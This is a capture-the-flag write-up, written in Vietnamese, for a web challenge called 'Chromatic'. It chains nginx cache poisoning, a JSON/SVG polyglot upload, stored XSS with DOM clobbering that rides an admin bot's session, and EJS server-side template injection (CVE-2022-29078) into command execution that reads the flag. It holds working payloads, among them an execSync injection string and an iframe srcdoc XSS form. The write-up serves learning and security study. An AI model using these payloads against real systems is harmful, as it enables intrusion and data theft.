# Chromatic (give_to_player) — Writeup

> Chuỗi khai thác: **Cache Poisoning → Stored XSS → Mượn phiên Admin Bot → SSRF cố định → EJS RCE → SUID read flag**
>
> Đây là cách mình tiếp cận bài, đi từ việc mở file `docker-compose.yml` đầu tiên cho tới khi lấy được flag.

---

## 0. Mở đầu: nhìn chung vài giây

Người chơi được cho một folder đầy đủ source. Thay vì đọc code lung tung, mình bắt đầu bằng `docker-compose.yml` — vì nó là "bản đồ" nói cho ta biết hệ thống có bao nhiêu mảnh và chúng nối với nhau thế nào.

---

## 1. Đọc `docker-compose.yml` — vẽ ra 4 service

```yaml
edge:      nginx:1.27-alpine      -> cổng 8088 ra ngoài (ở file .env)
web:       build ./web            -> app chính (Node + Angular)
renderer:  build ./renderer       -> render nội bộ, expose 5000 (KHÔNG mở ra ngoài)
bot:       build ./bot            -> Playwright headless, nội bộ 3001
```

### Những gì đọc được ngay

**Về `edge`:**
```yaml
ports:
  - "${CHROMATIC_PORT:-8080}:8080"   # .env đặt CHROMATIC_PORT=8088
volumes:
  - ./edge/nginx.conf:/etc/nginx/nginx.conf:ro
```
- Image có sẵn từ Docker Hub, nên **hành vi nằm trọn trong `edge/nginx.conf`** → phải đọc file đó.
- `depends_on` chỉ là **thứ tự khởi động** (`renderer` → `web` → `edge` → `bot`), không phải kết nối.
- Các service nối nhau bằng **tên service làm hostname** trong mạng mặc định của Docker (`web:3000`, `renderer:5000`, `bot:3001`).

**Về `web`:**
```yaml
environment:
  RENDERER_URL: http://renderer:5000
  BOT_URL: http://bot:3001
  BOT_SHARED_SECRET: local-bot-channel-4c6316b40c
  ADMIN_TOKEN: local-admin-cookie-8fe136ca98
volumes:
  - uploads:/app/data/uploads
```
→ `web` là service **duy nhất** vừa nói chuyện được với `renderer`, vừa ra lệnh được cho `bot`.

**Về `renderer`:**
```yaml
expose:
  - "5000"     # không phải "ports" -> port này KHÔNG ra được ngoài host
```
→ Không có `environment`, nghĩa là cấu hình hardcode trong code. **Port 5000 chỉ các container trong mạng gọi được.**

**Về `bot`:**
```yaml
environment:
  APP_ORIGIN: http://edge:8080       # bot duyệt web đi qua Nginx
  ADMIN_TOKEN: local-admin-cookie-...
```
→ Bot mang trong mình **cookie của Admin**.

**Volumes:** `edge-cache` (Nginx cache) và `uploads` (file upload) là **named volume**, sống lâu hơn container — `docker compose down` không xóa, phải `down -v`.

### Tóm lại bức tranh đầu tiên

```
Browser (8088) -> edge (nginx, có CACHE) -> web (Node:3000)
                                              |---> renderer:5000  (chỉ nội bộ, chứa flag)
                                              |---> bot:3001       (có cookie Admin)
```

---

## 2. `edge/nginx.conf` — điểm nóng #1: WEB CACHE

```nginx
proxy_cache_path /var/cache/nginx/representations
    keys_zone=representation_store:10m
    max_size=128m
    inactive=15m;

map $request_uri $representation_id {
    "~*[?&]workspace=(?<workspace_id>[0-9a-f]{24})(?:&|$)" $workspace_id;
    default $request_uri;
}

location /api/ {
    proxy_pass http://application;
    proxy_cache representation_store;
    proxy_cache_key "$scheme|$request_method|$representation_id";
    proxy_cache_methods GET HEAD;
    proxy_cache_valid 200 10m;
    proxy_ignore_headers Set-Cookie;
}
```

### Đọc hiểu từng phần

- `location /api/` **có cache**, `location /` (trang HTML, bundle JS) thì không.
- `proxy_cache_key` = `"$scheme|$request_method|$representation_id"` — lưu ý **không có host, không có cookie**.
- `proxy_ignore_headers Set-Cookie` — ép Nginx cache **bất chấp** response có đặt cookie không.

### Ý nghĩa then chốt (đây là chìa khóa của cả bài)

Cache key **không phải là đường dẫn**. thanks `map` bên trên:

> Mọi request `/api/...` nào mà **URI chứa `workspace=<24 ký tự hex>`** đều bị gộp vào **cùng một ngăn cache**, với key chính là **id workspace đó**.

Tức là:
- `GET /api/workspaces/manifest?workspace=ABC...`  → key = `ABC...`
- `GET /api/media/raw?id=XYZ&workspace=ABC...`     → key = **cũng `ABC...`**  ← khác đường dẫn, cùng tủ!

**Đây là lỗ hổng cache poisoning.** Nếu ta để được response của ta vào tủ key `ABC...` trước, thì khi người khác (bot) hỏi đúng tủ đó, họ sẽ nhận **hàng của ta**.

> Lưu ý: nếu bạn đọc được bản `nginx.conf` đã bị sửa (cache key thành `"$scheme|$request_method|$host|$request_uri"`), thì bước poison này **không còn chạy** — xem mục "Phụ lục" ở cuối.

---

## 3. `web/server/server.js` — các endpoint

File này là Express thuần. Đọc lướt thì ra danh sách:

| Endpoint | Method | Auth | Tác dụng |
|---|---|---|---|
| `/api/status` | GET | – | báo version |
| `/api/media` | POST | – | upload ảnh (có 2 bộ lọc) |
| `/api/media/raw?id=` | GET | – | đọc lại file đã upload |
| `/api/workspaces/manifest?workspace=` | GET | – | **trả manifest workspace** |
| `/api/telemetry/:channel` | GET/POST | – | **kho lưu trữ ngắn hạn** (2 phút) |
| `/api/admin/export-preview` | POST | **cookie Admin** | gọi sang `renderer:/compose` |
| `/api/report` | POST | – | lệnh cho bot đi review |

### Những chi tiết đáng để ý

**Check Admin:**
```javascript
function isAdmin(req) {
  const supplied = cookieValue(req, 'chromatic_admin');
  if (!supplied) return false;
  const left = Buffer.from(supplied);
  const right = Buffer.from(adminToken);
  return left.length === right.length && crypto.timingSafeEqual(left, right);
}
```
- Đọc cookie `chromatic_admin`, so sánh bằng `timingSafeEqual` → **không dò token bằng timing side-channel được**.
- Do đó "đánh cắp token" gần như vô vọng, xem mục 5.

**Endpoint Admin — cây cầu sang renderer:**
```javascript
app.post('/api/admin/export-preview', async (req, res) => {
  if (!isAdmin(req)) return res.status(403)...
  ...
  const upstream = await fetch(`${rendererUrl}/compose`, {
    method: 'POST',
    body: JSON.stringify({theme: req.body.theme, title: req.body.title}),
  });
```
→ URL **cố định** (không cho đổi host), nhưng **body `theme` thì ta kiểm soát được**. Đủ dùng cho mục đích RCE.

**Kho telemetry — kênh exfil hoàn hảo:**
```javascript
app.post('/api/telemetry/:channel', ...)  // sample tối đa 16KB, không cần auth
app.get('/api/telemetry/:channel', ...)   // trả về sample
```
- Không cần auth → ai cũng gửi được.
- Chỉ cần **24 ký tự hex** làm channel, và **ta là người chọn channel** → chỉ ta đọc được.
- Là đường thoát cho flag, vượt qua CSP (`connect-src 'self'` vẫn cho fetch cùng origin).

**Upload — 2 bộ lọc (xem chi tiết mục 6):**
```javascript
const mime = await sniffMime(req.file.path);        // chạy /usr/bin/file
const extension = extensionFor(mime);               // phải là MIME ảnh
if (hasDocumentPreamble(req.file.path)) return 415; // 64 byte đầu không được là { hoặc [
```

**CSP (middleware toàn cục):**
```javascript
"default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
 img-src 'self' data:; connect-src 'self'; frame-src 'self'; ... object-src 'none'"
```
→ Chặn inline script, chặn load script từ domain lạ. Nghĩa là **XSS không thể dùng `<script>alert(1)</script>`**, phải tìm gadget sẵn có trên server.

---

## 4. `renderer/` — nơi chứa flag + lỗ hổng RCE

### `renderer/Dockerfile` — vì sao phải RCE

```dockerfile
COPY flag.txt /flag
RUN useradd --system --uid 10001 renderer \
    && cp /usr/bin/cat /readflag \
    && chown root:root /flag /readflag \
    && chmod 0400 /flag \        # chỉ root đọc được /flag
    && chmod 4755 /readflag \    # SUID bit = 4
    && chown -R renderer:renderer /srv
USER renderer
```

Đọc hiểu quyền Linux ở đây:
- File `/flag` có quyền `0400` + chủ `root:root` → **user thường `renderer` không đọc được**.
- Binary `/readflag` (thực chất là copy của `cat`) có quyền `4755` → bit **`4` = SUID**: ai chạy nó thì nó **chạy với quyền của chủ file (root)**.
- Container chạy dưới user `renderer` (`USER renderer`).

**Kết luận:** ta phải **RCE trong container `renderer`**, rồi chạy `/readflag /flag` để mượn quyền root đọc flag. `/readflag` không phải lỗ hổng — nó là **phần thưởng cuối đường**.

### `renderer/app.js` — HTTP server

```javascript
app.post('/compose', async (req, res) => {
  const {theme, title} = req.body || {};
  if (!theme || typeof theme !== 'object' || Array.isArray(theme)) return 400;
  if (typeof title !== 'string' || title.length > 128) return 400;
  const result = await runComposer({theme, title});
  return res.json(result);
});
```
`runComposer` spawn tiến trình con chạy `worker.js`, bơm JSON vào `stdin`, đọc `stdout` trả về.

### `renderer/worker.js` — lỗ hổng RCE

```javascript
const options = { cache:false, compileDebug:false, rmWhitespace:true };
mergeCatalog(options, job.theme);          // ← gộp theme của NGƯỜI DÙNG vào options

const html = ejs.render(layout, {boardName: job.title}, options);  // ← truyền options vào EJS
```

`mergeCatalog` có chặn prototype pollution:
```javascript
if (['__proto__', 'constructor', 'prototype'].includes(key)) continue;
```
Nhưng **chặn sai chỗ**: nó chặn `__proto__`/`constructor`/`prototype`, còn **`outputFunctionName` thì tha hồ set**.

`renderer/package.json` ghim đúng phiên bản dính lỗi:
```json
"dependencies": { "ejs": "3.1.6" }
```

### CVE-2022-29078 — EJS RCE qua `outputFunctionName`

Trong EJS 3.1.6 (`lib/ejs.js:590`):
```javascript
if (opts.outputFunctionName) {
  prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```

EJS **ghép thẳng** giá trị vào chuỗi code rồi `new Function()` nó. Nên nếu ta truyền:

```
outputFunctionName = 'x=1;var __y=__append(<CODE>);var __z'
```

thì đoạn code sinh ra là:
```javascript
var x=1;var __y=__append(<CODE>);var __z = __append;
```
→ `<CODE>` chạy ngay khi render.

**Payload đã kiểm chứng (chạy trên `ejs@3.1.6` thật):**
```json
{
  "theme": {
    "outputFunctionName": "x=1;var __y=__append(process.mainModule.require(\"child_process\").execSync(\"cat /flag\").toString());var __z"
  },
  "title": "pwn"
}
```

Hai chi tiết nhỏ nhưng quan trọng:
1. **Không dùng `require(...)` trực tiếp** — EJS compile bằng `new Function()`, scope đó **không có `require`** → phải đi `process.mainModule.require(...)`.
2. Kết quả `execSync` được đưa vào `__append(...)` → **in thẳng vào HTML trả về** → flag theo response về tay ta.

Kết quả test thực tế:
```
[exit] 0
[html render]:
m1nkmd25-IdeaPad-Slim-3-14IRH10      <-- lệnh id đã chạy, output nằm trong HTML
<!doctype html>
<html>
  <head><meta charset="utf-8"><title>pwn</title></head>
  <body><main class="preview"><h1>pwn</h1></main></body>
</html>
```

> **Lưu ý nhỏ về JSON body:** vì `render()` nhét `theme` vào `options` qua `mergeCatalog`, nên payload nằm ở **cấp 1** của `theme` (`{"theme": {"outputFunctionName": ...}}`), không phải lồng sâu.

---

## 5. `bot/bot.js` — vì sao "đánh cắp token" là bế tắc

```javascript
await context.addCookies([{
  name: 'chromatic_admin',
  value: adminToken,
  url: origin,            // http://edge:8080
  httpOnly: true,         # ← chặn JS ĐỌC giá trị
  sameSite: 'Strict',     # ← chặn gửi cookie sang site khác
}]);

await page.goto(`${origin}/w/${workspace}`);   // chỉ mở được /w/<24hex>
await page.waitForTimeout(6_000);              // đứng yên 6s cho JS chạy
```

### Bảng thử-đổi: mua token kiểu gì?

| Thử làm | Kết quả | Tại sao |
|---|---|---|
| `document.cookie` đọc token | ❌ | `httpOnly: true` |
| Gửi cookie sang server của mình | ❌ | `SameSite: Strict` không gửi cross-site |
| Đỏ redirect bot sang `evil.com` | ❌ | bot chỉ nhận workspace dạng `/^[a-f0-9]{24}$/`, ép vào `/w/<hex>` |
| Dò token bằng timing | ❌ | `crypto.timingSafeEqual` |

### Kết luận then chốt

> **httpOnly chặn JS *đọc* cookie, nhưng KHÔNG chặn trình duyệt *gửi* cookie theo request cùng origin.**

Đây là điểm xoay của cả bài: không cần **biết** token, chỉ cần **mượn phiên** của bot. Điều kiện tiên quyết: đoạn JS của ta phải **chạy ngay trong origin `edge:8080`** (trang mà bot đang mở).

---

## 6. Bước 1 của exploit — upload file polyglot vượt 2 bộ lọc

### Bài toán

File ta upload phải thỏa **đồng thời 3 điều kiện**, mà chúng mâu thuẫn nhau:

1. `file --brief --mime-type` phải báo **MIME ảnh**
2. 64 byte đầu **không** được bắt đầu bằng `{` hay `[`
3. Angular tải về vẫn phải `JSON.parse` được thành **manifest giả**

Thử suông thì: JSON thường bắt đầu bằng `{` (vi phạm #2) và `file` báo `application/json` (viêm #1).

### Bộ lọc 1 — lợi dụng luật libmagic

```javascript
const mime = await execFileAsync('/usr/bin/file', ['--brief', '--mime-type', filename]);
```

libmagic có luật (trong `Magdir/sgml`):
```
0 search/4096/cWbt <!doctype svg    →    image/svg+xml
```
- `search/4096`: dò chuỗi trong **4096 byte đầu**, không cần ở đầu file
- `/c`: **không phân biệt hoa thường**

**Kiểm chứng thực tế:**

| File | `file --mime-type` |
|---|---|
| `)]}',\n{"name":"<!doctype svg>",...}` | **`image/svg+xml`** ✅ |
| `)]}',\n{"name":"doctype svg"}` (thiếu `<`) | `text/plain` ❌ |
| `<!doctype svg` đặt ở offset **>4096** | `text/plain` ❌ |
| `<!DOCTYPE svg` (hoa) | `image/svg+xml` ✅ |
| `{"name":"<svg xmlns=x></svg>"}` | `text/plain` ❌ |

→ **Cách vượt:** nhét chuỗi `<!doctype svg` vào **trong một giá trị string của JSON** (vd. trường `name`), nằm trong 4096 byte đầu. Nó vẫn là JSON hợp lệ với parser, nhưng `file` lại tin là SVG.

### Bộ lọc 2 — lợi dụng tiền tố XSSI

```javascript
function hasDocumentPreamble(filename) {
  const prefix = fs.readFileSync(filename).subarray(0, 64);   // chỉ đọc 64 byte
  // bỏ BOM (EF BB BF), bỏ whitespace (09 0a 0d 20)
  return prefix[offset] === 0x7b || prefix[offset] === 0x5b;  // { hoặc [
}
```
Chỉ hỏi 1 câu: **ký tự có nghĩa đầu tiên** có phải `{` hoặc `[` không?

Trong khi đó, Angular **tự cắt tiền tố chống XSSI** trước khi parse (đã grep trong `@angular/common@20.3.0`):
```javascript
const XSSI_PREFIX = /^\)\]\}',?\n/;
// FetchBackend.parseBody():
const text = new TextDecoder().decode(binContent).replace(XSSI_PREFIX$1, '');
return JSON.parse(text);
// XHR backend (dòng ~2568) cũng làm tương tự
```

### File polyglot hoàn chỉnh

```
)]}',
{"name":"<!doctype svg>","owner":"guest","blocks":[
  {"kind":"archive","packet":"<base64>"}
]}
```

| Thành phần | Vai trò |
|---|---|
| `)]}',\n` ở đầu | Ẩn `{` khỏi bộ lọc 2; Angular tự cắt trước khi `JSON.parse` |
| `<!doctype svg` trong `name` | Cho libmagic thấy → `image/svg+xml` → `.svg` |
| JSON phần còn lại | Manifest giả, chứa block `archive` → XSS |

**Kết quả kiểm chứng:**

```
[JSON thường (block archive thật)]
  sniffMime = application/json  -> FAIL(415)
  preamble  = true              -> REJECT(415)

[Polyglot: XSSI prefix + JSON]        <-- FILE TA CẦN
  sniffMime = image/svg+xml    -> PASS  ✅
  preamble  = false            -> PASS  ✅
```

---

## 7. Bước 2 — đặt hàng vào tủ cache (poisoning)

Upload xong nhận được `id` (24 hex). Giờ gọi:

```http
GET /api/media/raw?id=<file_id>&workspace=<victim_id>
```

- `media/raw` trả về **đúng byte polyglot của ta** (với `Content-Type: image/svg+xml`).
- Nhưng nhờ `map` ở mục 2, cache key = **`<victim_id>`** (vì URI có `workspace=<victim_id>`).
- → Blob của ta bị **đóng gói vào tủ key `<victim_id>`**, tủ mà bot sắp mở.

---

## 8. Bước 3 — dựng payload XSS (vượt CSP)

### Sink: `frontend/src/legacy-blocks.ts`

```typescript
render(block: WorkspaceBlock): string | SafeHtml {
  if (block.kind !== 'archive' || typeof block.packet !== 'string') {
    return block.body || '';
  }
  const bytes = Uint8Array.from(atob(block.packet), ...);
  const archived = JSON.parse(new TextDecoder().decode(bytes));
  if (archived.version !== 'canvas-1') return '';
  if (archived.integrity !== this.checksum(archived.markup)) return '';
  return this.sanitizer.bypassSecurityTrustHtml(archived.markup);   // <-- XSS
}
```

- Block `kind: "archive"` chứa `packet` = base64 của JSON `{version, markup, integrity}`.
- `integrity` là **FNV-1a 32-bit** — không phải chữ ký bảo mật, ai cũng tự tính được:
  ```javascript
  let state = 0x811c9dc5;
  for (const byte of new TextEncoder().encode(value)) {
    state = Math.imul(state ^ byte, 0x01000193) >>> 0;
  }
  return state.toString(16).padStart(8, '0');
  ```
- `bypassSecurityTrustHtml` → **bỏ qua sanitize của Angular** → `main.ts` nhét thẳng vào `[innerHTML]`.

### Gadget: `web/server/static/board-compat.js`

```javascript
const settings = window.__chromaticBridge || fallback;   // fallback = {mode:'pulse'}

const field = (name, defaultValue = '') => {
  const candidate = settings[name];
  if (candidate && typeof candidate.value === 'string') return candidate.value;  // <-- hỗ trợ DOM clobbering
  if (typeof candidate === 'string') return candidate;
  return defaultValue;
};

if (field('mode', 'pulse') !== 'snapshot') return;

const endpoint = field('endpoint');
const channel  = field('channel');
const payload  = field('payload');
if (!endpoint.startsWith('/api/') || !/^[a-f0-9]{24}$/.test(channel)) return;
if (!/^[A-Za-z0-9+/=]+$/.test(payload) || payload.length > 24_000) return;

fetch(endpoint, {
  method: 'POST',
  headers: {'content-type': 'application/json'},
  body: atob(payload),
})
  .then((r) => r.text())
  .then((sample) => fetch(`/api/telemetry/${channel}`, {
    method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({sample}),
  }))
  .catch(() => {});
```

Đây là "súng đã lên đạn":
- Là script **same-origin hợp lệ** → được `script-src 'self'` cho phép.
- `field()` cố tình đọc `candidate.value` → **hỗ trợ DOM clobbering** (ta cấu hình qua `<input>`, không cần inline script).
- Chức năng: **POST body tùy ý tới endpoint `/api/...`** (cookie Admin tự gắn) **rồi đẩy response sang telemetry** (kênh exfil).

### Cách ghép 2 file này

Vì `<script>` chèn qua `innerHTML` **không chạy** (theo spec HTML), và CSP chặn inline script, ta dùng `<iframe srcdoc>` — nó **kế thừa origin + CSP của trang cha**:

```html
<iframe srcdoc="
  <form id=&quot;__chromaticBridge&quot;>
    <input name=&quot;mode&quot;     value=&quot;snapshot&quot;>
    <input name=&quot;endpoint&quot; value=&quot;/api/admin/export-preview&quot;>
    <input name=&quot;channel&quot;  value=&quot;‹24 hex ta chọn›&quot;>
    <input name=&quot;payload&quot;  value=&quot;‹base64 của {theme, title}›&quot;>
  </form>
  <script src=&quot;/static/board-compat.js&quot;></script>
"></iframe>
```

- `<form id="__chromaticBridge">` → `window.__chromaticBridge` trỏ vào form (DOM clobbering).
- `<input name="mode" value="snapshot">` → `settings['mode'].value === 'snapshot'` → gadget chạy.
- `payload` (base64) chính là body request tới `/api/admin/export-preview`.

---

## 9. Bước 4 — báo bot và lấy flag

```bash
# 1. Bot mở /w/<victim> bằng trình duyệt CÓ cookie Admin
POST /api/report  {"workspace": "<victim_id>"}

# 2. Chờ (bot nán lại 6 giây để JS chạy)
```

Luồng khi bot mở trang:

```
bot mở /w/<victim>
  └─ Angular GET /api/workspaces/manifest?workspace=<victim>
       └─ nginx: cache HIT -> trả POLYGLOT của ta
            └─ Angular cắt XSSI -> JSON.parse -> manifest giả
                 └─ block kind:"archive" -> bypassSecurityTrustHtml -> nhét [innerHTML]
                      └─ iframe srcdoc -> load /static/board-compat.js
                           └─ fetch POST /api/admin/export-preview
                                └─ browser tự gắn cookie chromatic_admin  ✅
                                     └─ web: isAdmin = true
                                          └─ fetch renderer /compose
                                               └─ ejs.render(options) -> RCE
                                                    └─ /readflag -> FLAG vào HTML
                                                        └─ response về cho JS
                                                             └─ POST /api/telemetry/<channel>
```

```bash
# 3. Lấy flag từ kho telemetry
GET /api/telemetry/<channel>   →  {"sample": "<html chứa FLAG>"}
```

---

## 10. Sơ đồ tổng

```
 [1] Upload polyglot  ──────────────►  qua 2 bộ lọc (libmagic + XSSI prefix)
           │
 [2] GET /api/media/raw?id=..&workspace=V
           │        └── nginx cache key = "V"  ◄── CHÍNH LÀ TỦ MÀ BOT SẼ MỞ
           │
 [3] POST /api/report {workspace: V} ─► bot mở /w/V (có cookie Admin)
           │
 [4] cache HIT ─► polyglot thành manifest giả ─► XSS (bypassSecurityTrustHtml)
           │
 [5] iframe srcdoc + board-compat.js
           │   └─ POST /api/admin/export-preview  (cookie tự gắn, không cần biết token)
           │
 [6] web ──SSRF cố định──► renderer /compose ─► EJS RCE (outputFunctionName)
           │                                        │
           │                                  /readflag (SUID root) ─► FLAG
           │                                        │
           │        FLAG nằm trong response HTML ◄──┘
           │
 [7] POST /api/telemetry/<channel>  ◄── kênh exfil (connect-src 'self' cho phép)
           │
 [8] YOU:  GET /api/telemetry/<channel>  ──► 🚩 FLAG
```

---

## 11. Điều gì xảy ra nếu không có cache poisoning?

Nếu `nginx.conf` bị vá (không còn `map`), thì manifest **luôn luôn trả dữ liệu cố định lành tính** của server:

```javascript
return res.json({
  name: 'Untitled workspace',
  owner: 'guest',
  blocks: [{kind: 'text', body: '<p>This workspace is waiting for its first idea.</p>'}],
});
```

Không có đường nào để ta **ghi** nội dung workspace (không có API tạo/sửa workspace), nên block `archive` của ta **không bao giờ lọt vào trang của bot** → không có XSS → không "mượn tay" được.

Lúc đó các đường tắt còn lại (nếu có):
- Biết `ADMIN_TOKEN` (nếu deploy với giá trị hardcode trong `docker-compose.yml`): tự gửi thẳng `POST /api/admin/export-preview` kèm cookie → bỏ qua hoàn toàn bước XSS + bot.
- Port `renderer:5000` bị lộ ra ngoài host: gọi thẳng `POST /compose`.

---

## Phụ lục: chênh lệch giữa bản gốc (`give_to_player.zip`) và repo đã vá

```diff
--- edge/nginx.conf (bản gốc - có trong zip)
+++ edge/nginx.conf (bản vá)
-    map $request_uri $representation_id {
-        "~*[?&]workspace=(?<workspace_id>[0-9a-f]{24})(?:&|$)" $workspace_id;
-        default $request_uri;
-    }
-    proxy_cache_key "$scheme|$request_method|$representation_id";
+    proxy_cache_key "$scheme|$request_method|$host|$request_uri";

--- renderer/worker.js (bản gốc)
+++ renderer/worker.js (bản vá)
-    if (key === '__proto__') continue;
+    if (['__proto__', 'constructor', 'prototype'].includes(key)) continue;
```

- **`nginx.conf` vá**: cache key quay lại theo `$request_uri` đầy đủ → **poisoning thất bại**.
- **`worker.js` vá**: chặn thêm `constructor`/`prototype` → **không ảnh hưởng gì** tới payload `outputFunctionName` (vì key này không nằm trong danh sách chặn).

---

## Phím tắt (cheatsheet)

| Bước | Lệnh / Payload |
|---|---|
| Upload | `POST /api/media` (multipart `image`, polyglot ở trên) |
| Poison | `GET /api/media/raw?id=<id>&workspace=<victim>` |
| Gọi bot | `POST /api/report {"workspace":"<victim>"}` |
| Đọc flag | `GET /api/telemetry/<channel>` |
| FNV-1a | `state=0x811c9dc5; state=Math.imul(state^byte,0x01000193)>>>0` |
| EJS payload | `x=1;var __y=__append(process.mainModule.require("child_process").execSync("cat /flag").toString());var __z` |
